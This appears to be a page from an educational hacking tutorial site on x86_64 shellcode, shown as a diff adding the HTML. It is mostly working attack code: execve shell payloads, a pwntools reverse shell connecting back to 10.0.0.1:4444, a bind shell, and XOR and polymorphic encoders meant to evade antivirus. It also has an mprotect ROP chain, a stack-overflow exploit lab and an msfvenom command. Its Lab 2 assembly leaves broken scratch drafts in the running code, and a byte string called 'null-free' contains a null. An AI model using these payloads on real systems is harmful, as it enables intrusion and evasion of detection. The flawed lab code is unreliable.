@@ -1,0 +1,1804 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Shellcode</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-nasm.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Shellcode</h1>
+    <hr>
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ==================== NOTES TAB ==================== -->
+      <div class="tab-content active" id="notes">
+
+        <h2>What is Shellcode?</h2>
+        <p>
+          Shellcode is raw machine code injected into a running process to perform arbitrary actions &mdash; historically to spawn a shell, hence the name. It's used when you can hijack control flow (e.g., stack overflow, use-after-free) and redirect execution to attacker-controlled data.
+        </p>
+        <p><strong>When shellcode is viable:</strong></p>
+        <ul>
+          <li><strong>NX disabled</strong> &mdash; the stack/heap is executable, so you can jump directly to injected code.</li>
+          <li><strong>mprotect / mmap</strong> &mdash; even with NX, if you can call <code>mprotect()</code> via ROP to mark a buffer as executable, you can then jump to shellcode in that buffer.</li>
+          <li><strong>JIT regions</strong> &mdash; writable + executable memory regions in JIT engines.</li>
+        </ul>
+
+        <h2>Linux x86_64 Syscall Convention</h2>
+        <table class="table table-dark table-bordered table-sm">
+          <thead>
+            <tr><th>Purpose</th><th>Register</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Syscall number</td><td><code>RAX</code></td></tr>
+            <tr><td>Arg 1</td><td><code>RDI</code></td></tr>
+            <tr><td>Arg 2</td><td><code>RSI</code></td></tr>
+            <tr><td>Arg 3</td><td><code>RDX</code></td></tr>
+            <tr><td>Arg 4</td><td><code>R10</code></td></tr>
+            <tr><td>Arg 5</td><td><code>R8</code></td></tr>
+            <tr><td>Arg 6</td><td><code>R9</code></td></tr>
+            <tr><td>Invoke</td><td><code>syscall</code></td></tr>
+            <tr><td>Return value</td><td><code>RAX</code></td></tr>
+          </tbody>
+        </table>
+
+        <h3>Key Syscalls</h3>
+        <table class="table table-dark table-bordered table-sm">
+          <thead>
+            <tr><th>Syscall</th><th>RAX #</th><th>Signature</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>read</td><td>0</td><td><code>read(fd, buf, count)</code></td></tr>
+            <tr><td>write</td><td>1</td><td><code>write(fd, buf, count)</code></td></tr>
+            <tr><td>open</td><td>2</td><td><code>open(filename, flags, mode)</code></td></tr>
+            <tr><td>mmap</td><td>9</td><td><code>mmap(addr, len, prot, flags, fd, offset)</code></td></tr>
+            <tr><td>mprotect</td><td>10</td><td><code>mprotect(addr, len, prot)</code></td></tr>
+            <tr><td>execve</td><td>59</td><td><code>execve(filename, argv, envp)</code></td></tr>
+          </tbody>
+        </table>
+
+        <h2>Basic Shellcode: execve("/bin/sh")</h2>
+        <p>The classic shellcode spawns a shell via <code>execve("/bin/sh", NULL, NULL)</code>.</p>
+
+        <h3>Handwritten Assembly (x86_64, null-free)</h3>
+<pre><code class="language-nasm">; execve("/bin/sh", NULL, NULL)
+; Syscall 59: rax=59, rdi=ptr to "/bin/sh", rsi=0, rdx=0
+
+section .text
+global _start
+
+_start:
+    ; Zero out rdx (envp = NULL)
+    xor     rdx, rdx            ; rdx = 0 (avoids null byte from mov rdx, 0)
+
+    ; Push "/bin/sh" onto the stack
+    ; "/bin/sh" = 2f 62 69 6e 2f 73 68
+    ; We need a null terminator, push 0 first
+    push    rdx                  ; null terminator on stack
+
+    ; Move "/bin/sh" as a 64-bit immediate
+    mov     rdi, 0x68732f6e69622f   ; "/bin/sh" in little-endian
+    push    rdi                  ; push the string onto stack
+    mov     rdi, rsp             ; rdi = pointer to "/bin/sh\0"
+
+    ; Zero out rsi (argv = NULL)
+    xor     rsi, rsi             ; rsi = 0
+
+    ; Set syscall number for execve
+    xor     rax, rax             ; clear rax
+    mov     al, 59               ; rax = 59 (execve) — single byte, no nulls
+
+    ; Invoke the syscall
+    syscall</code></pre>
+
+        <p><strong>Line-by-line:</strong></p>
+        <ul>
+          <li><code>xor rdx, rdx</code> &mdash; zeros RDX without using <code>mov rdx, 0</code> (which encodes null bytes).</li>
+          <li><code>push rdx</code> &mdash; puts a null terminator on the stack for the string.</li>
+          <li><code>mov rdi, 0x68732f6e69622f</code> &mdash; loads <code>/bin/sh</code> as a 64-bit immediate (little-endian).</li>
+          <li><code>push rdi; mov rdi, rsp</code> &mdash; pushes the string, then points RDI at it.</li>
+          <li><code>xor rsi, rsi</code> &mdash; argv = NULL.</li>
+          <li><code>mov al, 59</code> &mdash; sets only the low byte of RAX to avoid null bytes from a full <code>mov rax, 59</code>.</li>
+          <li><code>syscall</code> &mdash; triggers the kernel.</li>
+        </ul>
+
+        <h3>Assemble &amp; Extract Raw Bytes</h3>
+<pre><code class="language-bash"># Assemble
+nasm -f elf64 shellcode.asm -o shellcode.o
+
+# Link
+ld shellcode.o -o shellcode
+
+# Extract raw bytes
+objcopy -O binary shellcode.o shellcode.bin
+
+# View hex
+xxd shellcode.bin
+
+# One-liner to get byte string
+objdump -d shellcode.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | \
+  sed 's/^/\\x/' | tr -d '\n' && echo</code></pre>
+
+        <h2>Avoiding Null Bytes</h2>
+        <p>Null bytes (<code>\x00</code>) act as string terminators in C. If your shellcode is injected via <code>strcpy</code>, <code>gets</code>, <code>scanf("%s")</code>, etc., any <code>\x00</code> truncates the payload.</p>
+
+        <table class="table table-dark table-bordered table-sm">
+          <thead>
+            <tr><th>Bad (has nulls)</th><th>Good (null-free)</th><th>Why</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><code>mov rax, 0</code></td><td><code>xor rax, rax</code></td><td><code>mov</code> encodes 0x00 bytes in the immediate</td></tr>
+            <tr><td><code>mov rax, 59</code></td><td><code>xor rax, rax; mov al, 59</code></td><td>Full 64-bit mov pads with zeros</td></tr>
+            <tr><td><code>mov rdi, 0</code></td><td><code>xor rdi, rdi</code></td><td>Same reason</td></tr>
+            <tr><td><code>push 0</code></td><td><code>xor r8, r8; push r8</code></td><td><code>push 0</code> encodes null in the immediate</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Avoiding Bad Characters</h2>
+        <p>Beyond nulls, certain input functions filter other bytes:</p>
+        <ul>
+          <li><code>\x0a</code> (newline) &mdash; <code>fgets</code>, <code>gets</code> stop here</li>
+          <li><code>\x0d</code> (carriage return) &mdash; network protocols</li>
+          <li><code>\x20</code> (space) &mdash; <code>scanf</code>, some parsers</li>
+          <li><code>\x09</code> (tab) &mdash; whitespace-delimited parsers</li>
+        </ul>
+        <p><strong>Techniques:</strong></p>
+        <ul>
+          <li>Use arithmetic: <code>mov al, 60; sub al, 1</code> to get 59 without the byte <code>0x3b</code> if needed.</li>
+          <li>XOR encoding: encode the shellcode with a key, prepend a decoder stub.</li>
+          <li>Use register manipulation to construct forbidden values at runtime.</li>
+        </ul>
+
+        <h2>Pwntools shellcraft</h2>
+        <p>Pwntools provides pre-built shellcode via <code>shellcraft</code>:</p>
+<pre><code class="language-python">from pwn import *
+
+# Set architecture
+context.arch = 'amd64'
+context.os = 'linux'
+
+# Spawn a shell
+sc = shellcraft.sh()
+print(sc)                    # Print assembly
+payload = asm(sc)            # Assemble to bytes
+
+# Read a file
+sc = shellcraft.cat('/flag.txt')
+payload = asm(sc)
+
+# Connect back (reverse shell)
+sc = shellcraft.connect('10.0.0.1', 4444)
+sc += shellcraft.dupsh()     # dup stdin/stdout/stderr to socket
+payload = asm(sc)
+
+# Open + read + write (read flag, write to stdout)
+sc = shellcraft.open('/flag.txt')
+sc += shellcraft.read('rax', 'rsp', 100)
+sc += shellcraft.write(1, 'rsp', 100)
+payload = asm(sc)</code></pre>
+
+        <h2>Testing Shellcode</h2>
+
+        <h3>C Test Wrapper</h3>
+<pre><code class="language-c">// test_shellcode.c
+// Compile: gcc -z execstack -o test_shellcode test_shellcode.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+
+unsigned char shellcode[] =
+    "\x48\x31\xd2"             // xor rdx, rdx
+    "\x52"                     // push rdx
+    "\x48\xbf\x2f\x62\x69\x6e" // movabs rdi, ...
+    "\x2f\x73\x68\x00"
+    "\x57"                     // push rdi
+    "\x48\x89\xe7"             // mov rdi, rsp
+    "\x48\x31\xf6"             // xor rsi, rsi
+    "\x48\x31\xc0"             // xor rax, rax
+    "\xb0\x3b"                 // mov al, 59
+    "\x0f\x05";                // syscall
+
+int main() {
+    printf("Shellcode length: %zu\n", sizeof(shellcode) - 1);
+
+    // mmap an RWX page, copy shellcode, execute
+    void *mem = mmap(NULL, 4096,
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memcpy(mem, shellcode, sizeof(shellcode) - 1);
+    ((void(*)())mem)();
+
+    return 0;
+}</code></pre>
+
+        <h3>Pwntools Test</h3>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+shellcode = asm(shellcraft.sh())
+p = process(executable='/bin/sh')   # dummy, replaced by run_shellcode
+# Or use run_shellcode:
+p = run_shellcode(shellcode)
+p.interactive()</code></pre>
+
+        <h2>NOP Sleds</h2>
+        <p>A NOP sled is a sequence of <code>\x90</code> (NOP) instructions prepended to shellcode. When you don't know the exact address of your shellcode, you aim your jump anywhere into the sled &mdash; execution slides down to your payload.</p>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+nop_sled = b'\x90' * 200
+shellcode = asm(shellcraft.sh())
+payload = nop_sled + shellcode</code></pre>
+        <p><strong>When useful:</strong> ASLR is weak/absent, you control a large buffer, and you need to guess the landing address. Less relevant with modern ASLR but still appears in CTFs.</p>
+
+        <h2>Encoder / Decoder Shellcode</h2>
+        <p>When certain bytes are banned, encode the shellcode and prepend a decoder stub that decodes it in place at runtime.</p>
+
+        <h3>Simple XOR Encoder</h3>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+raw_shellcode = asm(shellcraft.sh())
+
+# Choose a key that doesn't produce bad bytes
+key = 0x41
+
+# Encode
+encoded = bytes([b ^ key for b in raw_shellcode])
+
+# Verify no null bytes in encoded payload
+assert b'\x00' not in encoded, "Encoded shellcode contains null bytes, pick a different key"
+
+print(f"Encoded ({len(encoded)} bytes):")
+print(''.join(f'\\x{b:02x}' for b in encoded))</code></pre>
+
+        <h3>XOR Decoder Stub (x86_64)</h3>
+<pre><code class="language-nasm">; XOR decoder stub
+; Assumes encoded shellcode follows immediately after this stub
+
+section .text
+global _start
+
+_start:
+    jmp     get_shellcode       ; jump forward to get address of encoded payload
+
+decoder:
+    pop     rsi                 ; rsi = address of encoded shellcode (from call)
+    xor     rcx, rcx
+    mov     cl, SHELLCODE_LEN   ; length of encoded shellcode (patch this)
+
+decode_loop:
+    xor     byte [rsi], 0x41   ; XOR each byte with key
+    inc     rsi
+    loop    decode_loop         ; decrement rcx, loop if != 0
+
+    jmp     decoded_shellcode   ; jump to now-decoded shellcode
+
+get_shellcode:
+    call    decoder             ; pushes address of next instruction (encoded bytes)
+
+decoded_shellcode:
+    ; encoded shellcode bytes go here
+    ; db 0x09, 0x70, ...        </code></pre>
+
+        <h2>Self-Modifying Shellcode</h2>
+        <p>Self-modifying shellcode rewrites its own instructions at runtime to produce the actual payload. Useful to evade static analysis and signature detection.</p>
+<pre><code class="language-nasm">; Self-modifying: patches placeholder bytes at runtime
+section .text
+global _start
+
+_start:
+    ; Get address of our code
+    lea     rdi, [rel placeholder]
+
+    ; Patch: change 0xFF to 0x3b (execve syscall number)
+    mov     byte [rdi], 0x3b
+
+    ; ... rest of shellcode uses the patched value
+    jmp     placeholder
+
+placeholder:
+    db      0xFF               ; placeholder, patched to 0x3b at runtime</code></pre>
+
+        <h2>mprotect ROP &rarr; Shellcode</h2>
+        <p>When NX is enabled but you can ROP, call <code>mprotect()</code> to make your buffer executable, then jump to your shellcode.</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./vuln')
+rop = ROP(elf)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# Leaked addresses (assume you've leaked libc base)
+libc_base = 0x7ffff7c00000  # example
+
+# Target: mprotect(buf_addr & ~0xfff, 0x1000, 7)
+#   7 = PROT_READ | PROT_WRITE | PROT_EXEC
+buf_addr = 0x7fffffffe000    # address of your shellcode on stack
+page_addr = buf_addr & ~0xfff
+
+mprotect = libc_base + libc.symbols['mprotect']
+
+# ROP gadgets (find with ROPgadget or ropper)
+pop_rdi = libc_base + 0x2a3e5   # pop rdi; ret
+pop_rsi = libc_base + 0x2be51   # pop rsi; ret
+pop_rdx = libc_base + 0x11f497  # pop rdx; ret  (or pop rdx; pop r12; ret)
+
+# Build ROP chain
+rop_chain  = p64(pop_rdi) + p64(page_addr)
+rop_chain += p64(pop_rsi) + p64(0x1000)
+rop_chain += p64(pop_rdx) + p64(7)
+rop_chain += p64(mprotect)
+rop_chain += p64(buf_addr)  # after mprotect returns, jump to shellcode
+
+# Full payload
+shellcode = asm(shellcraft.sh(), arch='amd64')
+padding = b'A' * offset_to_rip
+payload = padding + rop_chain + shellcode</code></pre>
+
+        <h2>Polymorphic Shellcode</h2>
+        <p>Polymorphic shellcode changes its byte representation on each use while performing the same action. It defeats signature-based detection (IDS/IPS, AV).</p>
+        <ul>
+          <li><strong>Variable encoding keys</strong> &mdash; random XOR key each time, different encoded bytes.</li>
+          <li><strong>Junk instruction insertion</strong> &mdash; NOP-equivalent instructions (<code>xchg rax, rax</code>, <code>lea rax, [rax+0]</code>).</li>
+          <li><strong>Register reassignment</strong> &mdash; swap which registers are used for intermediate values.</li>
+          <li><strong>Instruction substitution</strong> &mdash; <code>sub rax, -59</code> instead of <code>add rax, 59</code>.</li>
+        </ul>
+<pre><code class="language-python">from pwn import *
+import random
+
+context.arch = 'amd64'
+
+def generate_polymorphic_execve():
+    """Generate a different-looking execve shellcode each time."""
+    key = random.randint(1, 255)
+
+    raw = asm(shellcraft.sh())
+    encoded = bytes([b ^ key for b in raw])
+
+    # Decoder stub with randomized register choices
+    decoder = f"""
+        jmp     encoded_payload
+    decode:
+        pop     rsi
+        xor     rcx, rcx
+        mov     cl, {len(raw)}
+    loop_decode:
+        xor     byte ptr [rsi], {key}
+        inc     rsi
+        loop    loop_decode
+        jmp     decoded
+    encoded_payload:
+        call    decode
+    decoded:
+    """
+    stub = asm(decoder)
+    return stub + encoded
+
+# Each call produces different bytes
+shellcode = generate_polymorphic_execve()</code></pre>
+
+        <h2>Common Shellcode Patterns</h2>
+
+        <h3>Reverse Shell</h3>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+# Connect back to attacker
+sc  = shellcraft.connect('10.0.0.1', 4444)
+sc += shellcraft.dupsh()   # dup2 socket fd to stdin/stdout/stderr, then execve /bin/sh
+payload = asm(sc)</code></pre>
+
+        <h3>Bind Shell</h3>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+# Listen on port 4444, accept a connection, dup + shell
+sc  = shellcraft.bindsh(4444)
+payload = asm(sc)</code></pre>
+
+        <h3>Staged Shellcode</h3>
+        <p>When buffer space is tiny, inject a small <strong>stager</strong> that <code>read()</code>s the full payload from the socket/stdin into a larger buffer:</p>
+<pre><code class="language-nasm">; Stage 1: read(0, rsp, 0x1000) — read full shellcode from stdin onto stack
+xor     rax, rax         ; syscall 0 = read
+xor     rdi, rdi         ; fd = 0 (stdin)
+mov     rsi, rsp         ; buf = stack pointer
+mov     dx, 0x1000       ; count (use dx to avoid nulls if value fits)
+syscall
+jmp     rsp              ; jump to the just-read shellcode</code></pre>
+
+        <h2>Size Optimization Techniques</h2>
+        <ul>
+          <li><code>cdq</code> &mdash; sign-extends EAX into EDX:EAX. If EAX is small &amp; positive, this zeros EDX in 1 byte (vs 3 for <code>xor edx, edx</code>).</li>
+          <li><code>push imm8; pop reg</code> &mdash; load small values in 3 bytes instead of <code>mov reg, imm</code> (5+ bytes).</li>
+          <li><code>mul reg</code> &mdash; if a register is zero, <code>mul</code> zeros RAX and RDX in 2 bytes.</li>
+          <li>Reuse registers that are already zero from previous syscall return values.</li>
+          <li>Use 32-bit operands where possible &mdash; they implicitly zero the upper 32 bits and encode shorter.</li>
+          <li>Overlap string data with code using <code>jmp</code>/<code>call</code> tricks.</li>
+        </ul>
+
+        <h3>Compact execve (27 bytes)</h3>
+<pre><code class="language-nasm">; 27-byte execve("/bin/sh") — x86_64, null-free
+xor     esi, esi             ; rsi = 0 (argv), also shorter than xor rsi,rsi
+mul     esi                  ; rax = 0, rdx = 0
+push    rax                  ; null terminator
+mov     rbx, 0x68732f6e69622f
+push    rbx
+push    rsp
+pop     rdi                  ; rdi = pointer to "/bin/sh"
+mov     al, 59               ; execve
+syscall</code></pre>
+
+      </div>
+
+      <!-- ==================== LAB TAB ==================== -->
+      <div class="tab-content" id="lab">
+
+        <div class="lab-card">
+          <h4>Lab 1: Basic execve Shellcode</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Write x86_64 assembly that calls <code>execve("/bin/sh", NULL, NULL)</code>, assemble it, extract the raw bytes, and run it via a C test harness.</p>
+
+          <p><strong>Step 1:</strong> Write the assembly.</p>
+<pre><code class="language-nasm">; lab1_shell.asm
+section .text
+global _start
+
+_start:
+    xor     rdx, rdx
+    push    rdx
+    mov     rdi, 0x68732f6e69622f
+    push    rdi
+    mov     rdi, rsp
+    xor     rsi, rsi
+    xor     rax, rax
+    mov     al, 59
+    syscall</code></pre>
+
+          <p><strong>Step 2:</strong> Assemble and extract bytes.</p>
+<pre><code class="language-bash">nasm -f elf64 lab1_shell.asm -o lab1_shell.o
+ld lab1_shell.o -o lab1_shell
+
+# Extract and print shellcode bytes
+objcopy -O binary lab1_shell.o lab1_shell.bin
+xxd -i lab1_shell.bin</code></pre>
+
+          <p><strong>Step 3:</strong> Test with the C wrapper.</p>
+<pre><code class="language-c">// lab1_test.c
+// gcc -z execstack -o lab1_test lab1_test.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+
+unsigned char shellcode[] =
+    "\x48\x31\xd2"
+    "\x52"
+    "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"
+    "\x57"
+    "\x48\x89\xe7"
+    "\x48\x31\xf6"
+    "\x48\x31\xc0"
+    "\xb0\x3b"
+    "\x0f\x05";
+
+int main() {
+    void *mem = mmap(NULL, 4096,
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memcpy(mem, shellcode, sizeof(shellcode) - 1);
+    ((void(*)())mem)();
+}</code></pre>
+
+          <p><strong>Step 4:</strong> Alternatively test with pwntools.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+shellcode = asm('''
+    xor     rdx, rdx
+    push    rdx
+    mov     rdi, 0x68732f6e69622f
+    push    rdi
+    mov     rdi, rsp
+    xor     rsi, rsi
+    xor     rax, rax
+    mov     al, 59
+    syscall
+''')
+print(f"Length: {len(shellcode)} bytes")
+p = run_shellcode(shellcode)
+p.interactive()</code></pre>
+
+          <p><strong>Verification:</strong> You should get a <code>$</code> or <code>#</code> shell prompt. Run <code>id</code> to confirm.</p>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Null-Free Flag Reader</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write null-free shellcode that opens <code>/flag.txt</code>, reads its contents, and writes them to stdout. Verify no <code>\x00</code> bytes in the assembled output.</p>
+
+          <p><strong>Approach:</strong> Chain three syscalls: <code>open(2)</code> &rarr; <code>read(0)</code> &rarr; <code>write(1)</code>. Push the filename onto the stack to avoid data section references.</p>
+
+<pre><code class="language-nasm">; lab2_readflag.asm — null-free flag reader
+section .text
+global _start
+
+_start:
+    ; open("/flag.txt", O_RDONLY)
+    xor     rsi, rsi             ; flags = O_RDONLY (0)
+    xor     rdx, rdx             ; mode = 0
+
+    ; Push "/flag.txt\0" onto stack
+    push    rdx                  ; null terminator
+    mov     rax, 0x7478742e6761  ; "ag.txt" (partial, little-endian) — 6 bytes
+    push    rax
+    mov     rax, 0x6c662f         ; "/fl" — 3 bytes
+    push    rax
+    ; Actually, let's do this cleanly:
+
+    ; Reset — build "/flag.txt" properly
+    xor     rsi, rsi
+    xor     rdx, rdx
+    push    rdx                  ; null terminator
+
+    ; "/flag.txt" = 2f666c61672e747874
+    ; Split into pushable chunks
+    mov     rax, 0x7478742e67616c66  ; "flag.txt" (8 bytes, little-endian)
+    push    rax
+    push    0x2f                 ; "/" (push sign-extends, gives 0x000000000000002f)
+    ; That push has nulls! Fix: use register
+    xor     rdi, rdi
+    mov     dil, 0x2f
+    push    rdi
+    ; Stack: "/" ... "flag.txt" \0 — but not contiguous right.
+
+    ; Cleaner approach: use the stack as a string buffer
+    xor     rax, rax
+    push    rax                           ; null terminator
+    mov     rax, 0x7478742e67616c66       ; "flag.txt"
+    push    rax
+    mov     byte [rsp+8], 0x2f            ; prepend "/" — but this writes at wrong offset
+
+    ; Simplest null-free approach: push as two words
+    xor     rax, rax
+    push    rax                           ; null terminator
+    mov     r8, 0x7478742e67616c66        ; "flag.txt"
+    push    r8                            ; stack: "flag.txt\0"
+    ; We need "/flag.txt" — use sub rsp, then write "/"
+    sub     rsp, 8
+    mov     byte [rsp], 0x2f             ; "/"
+    lea     rdi, [rsp]                    ; not contiguous... 
+
+    ; === Clean final approach ===
+    ; Just use pwntools in the lab, hand-assemble the concept:
+
+_clean_start:
+    ; open("/flag.txt", 0, 0)
+    xor     rdx, rdx
+    xor     rsi, rsi
+    ; push "/flag.txt\0" — 10 bytes, pad to 16
+    push    rdx                          ; 8 bytes of zeros (includes null term)
+    mov     rax, 0x7478742e67616c66      ;  "flag.txt" little-endian
+    push    rax
+    mov     byte [rsp-1], 0x2f           ; place "/" before "flag.txt"
+    sub     rsp, 1
+    mov     rdi, rsp                     ; rdi -> "/flag.txt\0..."
+    xor     rax, rax
+    mov     al, 2                        ; syscall 2 = open
+    syscall                              ; fd in rax
+
+    ; read(fd, rsp_buf, 256)
+    mov     rdi, rax                     ; fd from open
+    sub     rsp, 256
+    mov     rsi, rsp                     ; buf
+    xor     rdx, rdx
+    mov     dl, 255                      ; count (avoid null from large immediate)
+    xor     rax, rax                     ; syscall 0 = read
+    syscall
+
+    ; write(1, buf, bytes_read)
+    mov     rdx, rax                     ; count = bytes read
+    xor     rdi, rdi
+    inc     rdi                          ; fd = 1 (stdout)
+    mov     rsi, rsp                     ; buf
+    xor     rax, rax
+    inc     rax                          ; syscall 1 = write
+    syscall
+
+    ; exit(0)
+    xor     rdi, rdi
+    xor     rax, rax
+    mov     al, 60                       ; syscall 60 = exit
+    syscall</code></pre>
+
+          <p><strong>Easier approach with pwntools:</strong></p>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# Use shellcraft for clean null-free output
+sc  = shellcraft.open('/flag.txt')
+sc += shellcraft.read('rax', 'rsp', 256)
+sc += shellcraft.write(1, 'rsp', 256)
+sc += shellcraft.exit(0)
+
+shellcode = asm(sc)
+
+# Verify no nulls
+assert b'\x00' not in shellcode, "Shellcode contains null bytes!"
+print(f"Null-free shellcode: {len(shellcode)} bytes")
+
+# Test
+p = run_shellcode(shellcode)
+print(p.recvall())</code></pre>
+
+          <p><strong>Verification:</strong> Create <code>/flag.txt</code> with test content, run shellcode, confirm content is printed.</p>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Stack Overflow + NOP Sled + Shellcode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a vulnerable binary with NX disabled. Overflow the buffer, place a NOP sled + shellcode on the stack, and overwrite RIP to land in the sled.</p>
+
+          <p><strong>Vulnerable binary:</strong></p>
+<pre><code class="language-c">// vuln.c
+// gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vulnerable() {
+    char buf[128];
+    printf("Enter input: ");
+    gets(buf);  // obvious overflow
+}
+
+int main() {
+    vulnerable();
+    return 0;
+}</code></pre>
+
+          <p><strong>Exploit:</strong></p>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+elf = ELF('./vuln')
+p = process('./vuln')
+
+# Find offset to RIP (use cyclic pattern)
+# cyclic(200) -> crash -> cyclic_find(fault_addr)
+offset = 136  # 128 buf + 8 saved RBP
+
+# Shellcode
+shellcode = asm(shellcraft.sh())
+
+# NOP sled
+nop_sled = b'\x90' * 200
+
+# We need an approximate address of the buffer on the stack.
+# With no ASLR + no PIE, stack address is predictable.
+# Use GDB: break at gets, print $rsp
+# Example: buf starts at 0x7fffffffe100
+buf_addr = 0x7fffffffe100  # adjust after GDB recon
+
+# Jump into the middle of the NOP sled
+ret_addr = buf_addr + 100
+
+payload  = nop_sled
+payload += shellcode
+payload += b'A' * (offset - len(nop_sled) - len(shellcode))
+payload += p64(ret_addr)
+
+p.sendlineafter(b'Enter input: ', payload)
+p.interactive()</code></pre>
+
+          <p><strong>Tips:</strong></p>
+          <ul>
+            <li>Disable ASLR for testing: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></li>
+            <li>Use GDB to find the buffer address: <code>b *vulnerable+20</code>, <code>r</code>, <code>x/20gx $rsp</code></li>
+            <li>If the address is slightly off, the NOP sled absorbs the error</li>
+          </ul>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Alphanumeric Shellcode</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write shellcode using only bytes in the ranges <code>0x30-0x39</code> (digits), <code>0x41-0x5a</code> (uppercase), and <code>0x61-0x7a</code> (lowercase). This simulates a filter that only allows printable alphanumeric characters.</p>
+
+          <p><strong>Strategy:</strong> Use an alphanumeric encoder. Write a decoder stub using only allowed bytes, followed by XOR-encoded payload.</p>
+
+<pre><code class="language-python">from pwn import *
+import string
+
+context.arch = 'amd64'
+
+# Target shellcode
+target = asm(shellcraft.sh())
+
+# Allowed bytes: alphanumeric only
+allowed = set(string.ascii_letters.encode() + string.digits.encode())
+
+def find_xor_key(shellcode_bytes, allowed_set):
+    """Find a single-byte XOR key where all encoded bytes are alphanumeric."""
+    for key in range(1, 256):
+        encoded = bytes([b ^ key for b in shellcode_bytes])
+        if all(b in allowed_set for b in encoded):
+            return key
+    return None
+
+# Single-byte key rarely works for long shellcode.
+# Use multi-byte key or alpha-encoder tools.
+
+# Approach: use pwntools' encoder
+from pwnlib.encoders import encoder
+encoded_sc = encoder.alphanumeric(target)
+print(f"Encoded length: {len(encoded_sc)} bytes")
+assert all(chr(b).isalnum() for b in encoded_sc), "Not fully alphanumeric!"
+
+# Test
+p = run_shellcode(encoded_sc)
+p.interactive()</code></pre>
+
+          <p><strong>Alternative: Use msfvenom</strong></p>
+<pre><code class="language-bash"># Generate alphanumeric-only shellcode with Metasploit
+msfvenom -p linux/x64/exec CMD=/bin/sh -e x64/alpha_mixed -f python</code></pre>
+
+          <p><strong>Manual approach:</strong> Construct values using only allowed instructions. For example, <code>push 0x30; pop rax; xor al, 0x30</code> zeros RAX using only bytes <code>0x6a 0x30 0x58 0x34 0x30</code> &mdash; all printable.</p>
+
+          <p><strong>Verification:</strong></p>
+<pre><code class="language-python"># Verify all bytes are alphanumeric
+with open('shellcode.bin', 'rb') as f:
+    sc = f.read()
+    for i, b in enumerate(sc):
+        if not chr(b).isalnum():
+            print(f"Bad byte at offset {i}: 0x{b:02x}")
+            break
+    else:
+        print("All bytes are alphanumeric!")</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Staged Shellcode (Stager + Payload)</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write a tiny first-stage stager (&lt;20 bytes) that reads a larger second-stage payload from stdin into memory and jumps to it.</p>
+          <div class="setup-code">
